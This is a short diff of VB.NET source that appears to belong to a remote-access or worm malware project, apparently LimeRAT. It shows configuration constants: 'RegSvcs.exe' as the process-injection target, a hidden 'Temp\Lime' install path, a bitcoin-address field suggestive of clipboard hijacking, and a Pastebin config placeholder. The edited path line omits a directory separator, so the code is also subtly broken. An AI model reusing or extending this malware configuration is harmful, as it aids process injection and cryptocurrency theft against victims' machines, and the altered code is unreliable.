@@ -20,7 +20,7 @@
     Public Shared INJ_Name As String = "RegSvcs.exe" 'injection file
     Public Shared PATH1 As String = "Temp" 'Main Folder
     Public Shared PATH2 As String = "Lime" 'Sub Folder
-    Public Shared fullpath = Interaction.Environ(PATH1) & "\" & PATH2 & "\" & EXE 'Full path
+    Public Shared fullpath = Environ(PATH1) & PATH2 & "\" & EXE
     Public Shared BTC_ADDR As String = "THIS IS YOUR BTC 1234567890" 'Bitcoin address
 #Else
     Public Shared Pastebin As String = "%Pastebin%"
